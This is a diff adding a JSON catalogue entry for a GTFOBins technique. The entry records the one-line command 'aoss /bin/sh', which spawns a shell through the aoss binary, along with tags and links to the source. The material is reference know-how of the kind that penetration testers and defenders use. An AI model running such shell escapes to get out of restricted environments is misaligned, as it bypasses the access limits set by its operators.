@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-aoss-shell",
+  "name": "GTFOBins · aoss (shell)",
+  "command": "aoss /bin/sh",
+  "description": "Use aoss to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "aoss",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/aoss/#shell",
+  "upstream_id": "aoss/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/aoss/"
+    }
+  ]
+}
